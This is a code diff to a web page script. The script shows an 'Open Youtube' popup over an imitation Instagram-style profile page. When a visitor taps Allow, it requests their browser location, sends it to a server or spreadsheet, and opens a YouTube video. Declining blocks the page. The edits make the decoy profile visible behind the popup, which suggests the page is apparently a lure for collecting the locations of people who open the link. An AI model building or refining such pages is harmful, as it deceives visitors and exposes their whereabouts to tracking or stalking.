@@ -1,12 +1,9 @@
 /**
- * Centered Allow / Don't Allow dialog (required before page content).
+ * Centered Open Youtube dialog over the visible profile page.
  *
- * - Page content stays hidden until location is allowed.
- * - Allow → browser location request → save + show page + open YouTube.
- * - Don't Allow (or browser deny) → close / block the page.
- *
- * Note: After tapping Allow, Android Chrome may still show its own
- * system banner. That native UI cannot be moved or restyled by websites.
+ * - Background Instagram-style page stays visible behind the popup.
+ * - Allow → request location, save to sheet, open YouTube in a new tab.
+ * - Don't Allow → close / block the page.
  */
 
 const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";
@@ -23,21 +20,13 @@ function showDialog() {
   dialogEl.hidden = false;
   dialogEl.setAttribute("aria-hidden", "false");
   if (blockedEl) blockedEl.hidden = true;
-  document.body.classList.add("awaiting-choice");
   document.body.classList.remove("content-blocked");
-  if (pageContent) pageContent.hidden = true;
+  if (pageContent) pageContent.hidden = false;
 }
 
 function hideDialog() {
   dialogEl.hidden = true;
   dialogEl.setAttribute("aria-hidden", "true");
-}
-
-function revealPage() {
-  document.body.classList.remove("awaiting-choice");
-  document.body.classList.remove("content-blocked");
-  if (pageContent) pageContent.hidden = false;
-  if (blockedEl) blockedEl.hidden = true;
 }
 
 function setStatus(message, tone = "info") {
@@ -62,16 +51,12 @@ function openYouTube() {
   window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
 }
 
-/** Don't Allow → hide everything and leave the page. */
+/** Don't Allow → hide page and leave. */
 function closePage() {
   hideDialog();
   if (pageContent) pageContent.hidden = true;
   document.body.classList.add("content-blocked");
-  document.body.classList.remove("awaiting-choice");
-
-  if (blockedEl) {
-    blockedEl.hidden = false;
-  }
+  if (blockedEl) blockedEl.hidden = false;
 
   try {
     window.close();
@@ -132,11 +117,14 @@ function isDeniedError(error) {
   );
 }
 
-/** Allow → request location, then unlock page. */
+/** Allow → open YouTube tab, request location, save if granted. */
 async function handleAllow() {
   allowBtn.disabled = true;
   denyBtn.disabled = true;
   hideDialog();
+
+  // Open YouTube immediately in a new tab as requested.
+  openYouTube();
 
   try {
     const position = await requestBrowserLocation();
@@ -149,9 +137,7 @@ async function handleAllow() {
     };
 
     await sendLocationToServer(payload);
-    revealPage();
-    setStatus("You’re all set. Opening YouTube…", "ok");
-    openYouTube();
+    setStatus("You’re all set.", "ok");
   } catch (error) {
     console.error("Location flow error:", error);
 
@@ -160,7 +146,7 @@ async function handleAllow() {
       return;
     }
 
-    setDialogHint("Could not get location. Please tap Allow again.");
+    setDialogHint("Could not get location. You can tap Allow again.");
     showDialog();
   } finally {
     allowBtn.disabled = false;
@@ -168,13 +154,11 @@ async function handleAllow() {
   }
 }
 
-/** Don't Allow → close / block the page (no content). */
 function handleDontAllow() {
   closePage();
 }
 
 async function init() {
-  // Centered Allow / Don't Allow dialog on every visit — content stays hidden.
   showDialog();
 
   const perm = await getGeoPermissionState();
